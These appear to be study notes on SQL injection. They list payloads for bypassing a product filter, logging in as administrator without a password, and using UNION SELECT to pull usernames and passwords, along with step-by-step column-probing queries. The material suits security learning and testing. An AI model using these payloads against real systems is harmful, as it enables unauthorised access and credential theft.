SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1

=======================

SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

=======================

This is done using the UNION keyword, which lets you execute an additional SELECT query and append the results to the original query.

SELECT a, b FROM table1 UNION SELECT c, d FROM table2

SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--

How many columns are being returned from the original query? 
	A/ Inject a series of UNION SELECT payloads specifying a different number of null values until an error is returned.
		' UNION SELECT NULL--
		' UNION SELECT NULL,NULL--
		' UNION SELECT NULL,NULL,NULL--
		etc.

Which columns returned from the original query are of a suitable data type to hold the results from the injected query?
	A/ Probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn.
		' UNION SELECT 'a',NULL,NULL,NULL--
		' UNION SELECT NULL,'a',NULL,NULL--
		' UNION SELECT NULL,NULL,'a',NULL--
		' UNION SELECT NULL,NULL,NULL,'a'--
